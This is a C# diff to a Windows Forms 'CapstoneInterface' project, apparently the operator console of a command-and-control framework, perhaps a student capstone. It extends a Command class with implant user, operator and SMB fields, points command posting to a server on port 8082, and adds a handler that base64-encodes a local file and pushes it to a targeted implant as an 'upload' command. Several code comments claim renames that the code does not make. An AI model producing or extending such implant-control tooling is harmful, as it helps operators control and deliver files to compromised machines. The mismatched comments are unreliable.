@@ -34,12 +34,14 @@ namespace CapstoneInterface
         public class Command
         {
             public string Input { get; set; }
+            public string command { get; set; }
+            public string Args { get; set; }
             public string ImplantUser { get; set; }
             public string Operator { get; set; }
-            public string timeToExec { get; set; }
             public string delay { get; set; }
+            public string timeToExec { get; set; }
             public string File { get; set; }
-            public string command { get; set; }
+            public string UseSmb { get; set; }
         }
         public class User
         {
@@ -187,7 +189,22 @@ namespace CapstoneInterface
 
         private void btnProcesses_Click(object sender, EventArgs e)
         {
+            // Create an instance of the OpenFileDialog class
+            OpenFileDialog openFileDialog = new OpenFileDialog();
+            openFileDialog.InitialDirectory = "c:\\"; // You can set the initial directory
+            openFileDialog.Filter = "All files (*.*)|*.*"; // You can filter to specific file types
+            openFileDialog.FilterIndex = 2;
+            openFileDialog.RestoreDirectory = true;
 
+            string filePath = string.Empty;
+
+            // Show the dialog and get result.
+            if (openFileDialog.ShowDialog() == DialogResult.OK)
+            {
+                // Get the selected file's full path
+                filePath = openFileDialog.FileName;
+                lblFileToUploadPath.Text = filePath;
+            }
         }
 
         private void txtImplantCode_TextChanged(object sender, EventArgs e)
@@ -337,7 +354,7 @@ namespace CapstoneInterface
         {
             HttpClient client = new HttpClient();
             var content = new StringContent(jsonCommand, Encoding.UTF8, "application/json");
-            var response = await client.PostAsync("http://" + host + ":8081/fetchCommand", content);
+            var response = await client.PostAsync("http://" + host + ":8082/postCommand", content);
 
             // Wait for 10 seconds
             await Task.Delay(10000);
@@ -1067,6 +1084,33 @@ Invoke-Run
                     ChangeButtonTextColors(control.Controls, buttonNames);
                 }
             }
+        }
+
+        private void btnUploadFile_Click(object sender, EventArgs e)
+        {
+            string filepath = lblFileToUploadPath.Text;
+
+            Command commandForImplant = new Command();
+
+            commandForImplant.Input = ""; // Keep as is
+            commandForImplant.command = "upload"; // Renamed from 'command' to 'Command'
+            commandForImplant.Args = ""; // New property, set as needed
+            commandForImplant.ImplantUser = userToControl; // Keep as is
+            commandForImplant.Operator = operatorName; // Keep as is
+            commandForImplant.timeToExec = "0"; // Renamed from 'timeToExec' to 'TimeToExec'
+            commandForImplant.delay = "0"; // Renamed from 'delay' to 'Delay'
+            
+            byte[] fileBytes = File.ReadAllBytes(filepath);
+            string base64File = Convert.ToBase64String(fileBytes);
+            commandForImplant.File = base64File;
+
+            commandForImplant.UseSmb = "false"; // New property, set as needed or default
+
+            dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
+
+/*            richTextBox1.Text = "";
+            richTextBox1.Text = jsonCommand;*/
+            sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
         }
     }
 }
